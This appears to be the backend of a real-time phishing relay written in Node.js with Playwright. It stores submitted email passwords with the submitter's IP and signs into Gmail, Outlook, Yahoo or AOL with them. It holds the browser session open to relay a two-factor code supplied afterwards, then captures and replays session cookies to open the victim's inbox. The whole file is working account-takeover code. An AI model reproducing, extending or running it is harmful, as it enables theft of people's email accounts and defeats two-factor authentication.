const { chromium } = require('playwright');
const mongoose = require('mongoose');
const Credential = require('../models/Credential');

const activeSessions = new Map();
const memoryCredentials = new Map();

function createMemoryId() {
  return `mem-${Date.now()}-${Math.random().toString(16).slice(2)}`;
}

async function createCredentialRecord({ email, password, provider, ip, status = 'Pending' }) {
  if (mongoose.connection.readyState === 1) {
    return Credential.create({ email, password, provider, ip, status });
  }

  const record = {
    _id: createMemoryId(),
    email,
    password,
    provider,
    ip,
    status,
    cookies: [],
    createdAt: new Date(),
    updatedAt: new Date(),
  };

  memoryCredentials.set(record._id, record);
  return record;
}

async function findCredentialById(accountId) {
  if (mongoose.connection.readyState === 1) {
    return Credential.findById(accountId);
  }

  return memoryCredentials.get(accountId) || null;
}

async function updateCredentialRecord(accountId, payload) {
  if (mongoose.connection.readyState === 1) {
    return Credential.findByIdAndUpdate(accountId, payload, { new: true });
  }

  const existing = memoryCredentials.get(accountId) || { _id: accountId, cookies: [] };
  const updated = {
    ...existing,
    ...payload,
    updatedAt: new Date(),
  };

  memoryCredentials.set(accountId, updated);
  return updated;
}

async function getAllCredentialsDB() {
  if (mongoose.connection.readyState === 1) {
    return Credential.find().sort({ createdAt: -1 }).lean();
  }

  return [...memoryCredentials.values()].sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
}

const PROVIDER_CONFIG = {
  gmail: {
    loginUrl: 'https://accounts.google.com/signin/v2/identifier',
    inboxUrl: 'https://mail.google.com/',
  },
  outlook: {
    loginUrl: 'https://login.live.com/',
    inboxUrl: 'https://outlook.live.com/mail/',
  },
  yahoo: {
    loginUrl: 'https://login.yahoo.com',
    inboxUrl: 'https://mail.yahoo.com/',
  },
  aol: {
    loginUrl: 'https://login.aol.com',
    inboxUrl: 'https://mail.aol.com/',
  },
  live: {
    loginUrl: 'https://login.live.com/',
    inboxUrl: 'https://outlook.live.com/mail/',
  },
};

function getProviderConfig(provider = 'gmail') {
  return PROVIDER_CONFIG[provider] || PROVIDER_CONFIG.gmail;
}

async function persistCookiePayload(accountId, cookies) {
  await updateCredentialRecord(accountId, {
    cookies: cookies.map((cookie) => ({
      ...cookie,
      expires: cookie.expires ?? 0,
    })),
  });
}

async function closeSession(accountId) {
  const session = activeSessions.get(accountId);
  if (!session) {
    return;
  }

  try {
    await session.context.close();
  } catch (error) {
    console.log(`[${accountId}] Failed to close browser context:`, error.message);
  }

  try {
    await session.browser.close();
  } catch (error) {
    console.log(`[${accountId}] Failed to close browser:`, error.message);
  }

  activeSessions.delete(accountId);
}

function cleanupExpiredSessions() {
  const now = Date.now();

  for (const [accountId, session] of activeSessions.entries()) {
    if (session.expiresAt <= now) {
      console.log(`[${accountId}] 2FA session expired; closing Playwright session.`);
      closeSession(accountId).catch((error) => {
        console.log(`[${accountId}] Cleanup error:`, error.message);
      });

      updateCredentialRecord(accountId, {
        status: 'Failed',
      }).catch(() => undefined);
    }
  }
}

setInterval(cleanupExpiredSessions, 30000);

async function loginWithProvider({ accountId, email, password, provider, ip }) {
  const normalizedProvider = (provider || 'gmail').toLowerCase();
  const config = getProviderConfig(normalizedProvider);

  console.log(`[${accountId}] Starting login flow for ${normalizedProvider} using ${email} from ${ip}`);

  let browser;
  let context;
  let page;

  try {
    browser = await chromium.launch({
      headless: true,
    });

    context = await browser.newContext({
      viewport: { width: 1366, height: 900 },
      ignoreHTTPSErrors: true,
    });

    page = await context.newPage();
    await page.goto(config.loginUrl, { waitUntil: 'domcontentloaded', timeout: 60000 });

    // NOTE: ":visible" is critical here. Providers like Google render hidden
    // decoy fields (e.g. <input name="hiddenPassword" aria-hidden="true">)
    // that match generic selectors but can never be filled.
    const emailInput = page.locator(
      'input[type="email"]:visible, input[name*="email" i]:visible, input[id*="email" i]:visible, input[autocomplete="username"]:visible, input[name="username"]:visible, input[name*="user" i]:visible'
    ).first();
    const passwordInput = page.locator(
      'input[type="password"]:visible, input[name*="pass" i]:visible, input[id*="pass" i]:visible'
    ).first();

    let advancedToNextStep = false;

    if ((await emailInput.count()) > 0) {
      await emailInput.fill(email);

      // Multi-step providers (Google/Microsoft) require clicking "Next"
      // after the email before the password field is rendered.
      const nextButton = page.locator(
        '#identifierNext button, button:has-text("Next"), button:has-text("Sign in"), button:has-text("Continue"), input[type="submit"], button[type="submit"]'
      ).first();

      if ((await nextButton.count()) > 0) {
        await nextButton.click({ timeout: 5000 }).catch(() => undefined);
        advancedToNextStep = true;
      } else {
        await emailInput.press('Enter').catch(() => undefined);
        advancedToNextStep = true;
      }
    }

    // Wait for the real (visible) password field to appear on multi-step flows.
    if (advancedToNextStep && (await passwordInput.count()) === 0) {
      await passwordInput.waitFor({ state: 'visible', timeout: 15000 }).catch(() => undefined);
    }

    if ((await passwordInput.count()) > 0) {
      await passwordInput.fill(password);
      await passwordInput.press('Enter');
    } else if (!advancedToNextStep) {
      const submitButton = page.locator('button:has-text("Next"), button:has-text("Sign in"), input[type="submit"], button[type="submit"]').first();
      if ((await submitButton.count()) > 0) {
        await submitButton.click();
      }
    }

    await page.waitForTimeout(3000);

    const pageText = await page.textContent('body').catch(() => '');
    const pageUrl = page.url();
    const hasTwoFactorSignal =
      /2fa|mfa|otp|one-time|verification|verify|challenge|authenticator|security code/i.test(pageText) ||
      /2fa|mfa|otp|verification|challenge|authenticator/i.test(pageUrl);

    const otpFieldExists =
      (await page.locator('input[autocomplete="one-time-code"]:visible, input[name*="otp" i]:visible, input[name*="code" i]:visible, input[name*="verification" i]:visible, input[inputmode="numeric"]:visible').count()) > 0;

    if (hasTwoFactorSignal || otpFieldExists) {
      console.log(`[${accountId}] Detected 2FA challenge. Saving active session for verification.`);
      await updateCredentialRecord(accountId, {
        status: 'Requires 2FA',
      });

      activeSessions.set(accountId, {
        browser,
        context,
        page,
        expiresAt: Date.now() + 5 * 60 * 1000,
      });

      return {
        status: 'Requires 2FA',
        accountId,
        provider: normalizedProvider,
        message: '2FA required. Please provide the code to continue.',
      };
    }

    await page.waitForTimeout(4000);

    const cookies = await context.cookies();
    const finalUrl = page.url();
    const pageTitle = await page.title().catch(() => '');
    const loginVisible = /login|signin|sign in|account/i.test(finalUrl) || /login|signin|sign in|account/i.test(pageTitle);

    if (loginVisible && cookies.length === 0) {
      throw new Error('Login flow did not complete successfully.');
    }

    await persistCookiePayload(accountId, cookies);
    await updateCredentialRecord(accountId, {
      status: 'Completed',
      cookies: cookies.map((cookie) => ({ ...cookie, expires: cookie.expires ?? 0 })),
    });

    console.log(`[${accountId}] Login succeeded. Cookies captured for ${normalizedProvider}.`);
    await browser.close();

    return {
      status: 'Completed',
      accountId,
      provider: normalizedProvider,
      pageTitle,
      finalUrl,
      cookiesCount: cookies.length,
      message: 'Login succeeded and cookies were saved.',
    };
  } catch (error) {
    console.log(`[${accountId}] Login failed:`, error.message);

    if (browser) {
      await browser.close().catch(() => undefined);
    }

    await updateCredentialRecord(accountId, {
      status: 'Failed',
    });

    return {
      status: 'Failed',
      accountId,
      provider: normalizedProvider,
      message: error.message,
    };
  }
}

async function verifyTwoFactor(accountId, code) {
  const session = activeSessions.get(accountId);
  if (!session) {
    throw new Error('No active 2FA session found for this account.');
  }

  console.log(`[${accountId}] Submitting 2FA code to active browser session.`);

  try {
    const otpInput = session.page.locator(
      'input[autocomplete="one-time-code"]:visible, input[name*="otp" i]:visible, input[name*="code" i]:visible, input[name*="verification" i]:visible, input[inputmode="numeric"]:visible'
    ).first();

    if ((await otpInput.count()) > 0) {
      await otpInput.fill(String(code).trim());
      const submitButton = session.page.locator('button:has-text("Verify"), button:has-text("Submit"), button:has-text("Next"), input[type="submit"]').first();
      if ((await submitButton.count()) > 0) {
        await submitButton.click();
      }
    }

    await session.page.waitForTimeout(5000);
    const cookies = await session.context.cookies();
    const finalUrl = session.page.url();
    const pageTitle = await session.page.title().catch(() => '');

    if (cookies.length > 0) {
      await persistCookiePayload(accountId, cookies);
      await updateCredentialRecord(accountId, {
        status: 'Completed',
        cookies: cookies.map((cookie) => ({ ...cookie, expires: cookie.expires ?? 0 })),
      });

      console.log(`[${accountId}] 2FA completed and cookies extracted.`);
      await closeSession(accountId);

      return {
        status: 'Completed',
        accountId,
        finalUrl,
        pageTitle,
        cookiesCount: cookies.length,
      };
    }

    return {
      status: 'Failed',
      accountId,
      finalUrl,
      pageTitle,
      message: 'The 2FA code did not produce a valid authenticated session.',
    };
  } catch (error) {
    console.log(`[${accountId}] 2FA verification error:`, error.message);
    await updateCredentialRecord(accountId, {
      status: 'Failed',
    });
    await closeSession(accountId);
    return {
      status: 'Failed',
      accountId,
      message: error.message,
    };
  }
}

async function launchSessionWithCookies(accountId) {
  const record = await findCredentialById(accountId);
  if (!record) {
    throw new Error('No record found for this account.');
  }

  if (!Array.isArray(record.cookies) || record.cookies.length === 0) {
    throw new Error('No saved cookies for this account.');
  }

  const providerConfig = getProviderConfig(record.provider);
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext({ ignoreHTTPSErrors: true });

  await context.addCookies(
    record.cookies.map((cookie) => ({
      ...cookie,
      expires: typeof cookie.expires === 'number' ? cookie.expires : undefined,
    }))
  );

  const page = await context.newPage();
  await page.goto(providerConfig.inboxUrl, { waitUntil: 'domcontentloaded', timeout: 60000 });

  const title = await page.title().catch(() => '');
  const url = page.url();
  const isAuthenticated = !/login|signin|sign in|account/i.test(url) && !/login|signin|sign in|account/i.test(title);

  await browser.close();

  if (!isAuthenticated) {
    return {
      ok: false,
      status: 'Failed',
      title,
      url,
      message: 'Cookie session did not authenticate successfully.',
    };
  }

  return {
    ok: true,
    status: 'Completed',
    title,
    url,
    message: 'Cookie-based session launched successfully.',
  };
}

async function getAllCredentials() {
  return getAllCredentialsDB();
}

module.exports = {
  createCredentialRecord,
  findCredentialById,
  updateCredentialRecord,
  loginWithProvider,
  verifyTwoFactor,
  launchSessionWithCookies,
  getAllCredentials,
  activeSessions,
};
